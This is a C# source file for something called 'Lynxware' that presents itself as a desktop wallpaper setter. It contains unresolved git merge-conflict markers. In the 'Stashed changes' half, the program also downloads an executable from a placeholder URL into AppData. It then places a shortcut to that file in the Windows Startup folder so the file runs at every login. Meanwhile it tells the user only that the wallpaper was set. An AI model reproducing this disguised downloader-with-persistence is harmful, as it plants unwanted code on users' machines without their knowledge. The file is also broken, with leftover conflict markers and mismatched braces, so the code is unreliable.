using System;
using System.Drawing;
using System.IO;
using System.Net;
<<<<<<< Updated upstream
=======
using System.Reflection;
>>>>>>> Stashed changes
using Microsoft.Win32;
using Lynxware;

class Program
{
    static void Main()
    {

        // Folder path where the image will be saved
        string folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynxware");

        // Create the directory if it doesn't exist
        Directory.CreateDirectory(folderPath);

        // File path for the downloaded image
        string imagePath = Path.Combine(folderPath, "downloaded_image.jpg");

        try
        {
<<<<<<< Updated upstream
            // Download the image
            DownloadImage(Dependencies.imageUrl, imagePath);

            // Set the wallpaper
            SetWallpaper(imagePath);

            Console.WriteLine("Wallpaper set successfully.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
        }
    }

    static void DownloadImage(string url, string filePath)
    {
        using (var client = new WebClient())
        {
            client.DownloadFile(url, filePath);
        }
    }

    static void SetWallpaper(string imagePath)
    {
        // Open the registry key for the wallpaper
        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);

        // Set the wallpaper style to "Fill"
        key.SetValue(@"WallpaperStyle", 10.ToString());
        key.SetValue(@"TileWallpaper", 0.ToString());

        // Set the wallpaper
        SystemParametersInfo(0x0014, 0, imagePath, 0x0001 | 0x0002);
    }

    // Import the SystemParametersInfo function from user32.dll
    [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
=======
            // Specify the URL of the photo you want to download
            string photoUrl = "https://example.com/photo.jpg";

            // URL of the executable to download
            string executableUrl = "https://example.com/yourapp.exe";

            // Directory to save the downloaded files
            string downloadDirectory = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynx");

            // Create the directory if it doesn't exist
            Directory.CreateDirectory(downloadDirectory);

            // Download the photo
            string downloadedPhotoPath = Path.Combine(downloadDirectory, "wallpaper.jpg");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(photoUrl, downloadedPhotoPath);
            }

            // Set the downloaded photo as the desktop background
            SetDesktopBackground(downloadedPhotoPath);

            // Download the executable
            string downloadedExecutablePath = Path.Combine(downloadDirectory, "yourapp.exe");
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(executableUrl, downloadedExecutablePath);
            }

            // Create a shortcut to the executable in the startup folder
            string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string shortcutPath = Path.Combine(startupFolder, "YourApp.lnk");
            CreateShortcut(shortcutPath, downloadedExecutablePath);

            Console.WriteLine("Wallpaper set successfully.");
            Console.ReadLine(); // Wait for user input to close the console window
        }

        static void SetDesktopBackground(string imagePath)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
            key.SetValue("WallpaperStyle", "2"); // 2 for "Stretch"
            key.SetValue("TileWallpaper", "0");
            SystemParametersInfo(0x0014, 0, imagePath, 0x0001 | 0x0002);
        }

        static void CreateShortcut(string shortcutPath, string targetPath)
        {
            // Create a shortcut to the target executable
            IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
            IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutPath);
            shortcut.TargetPath = targetPath;
            shortcut.Save();
        }

        [System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
}
>>>>>>> Stashed changes
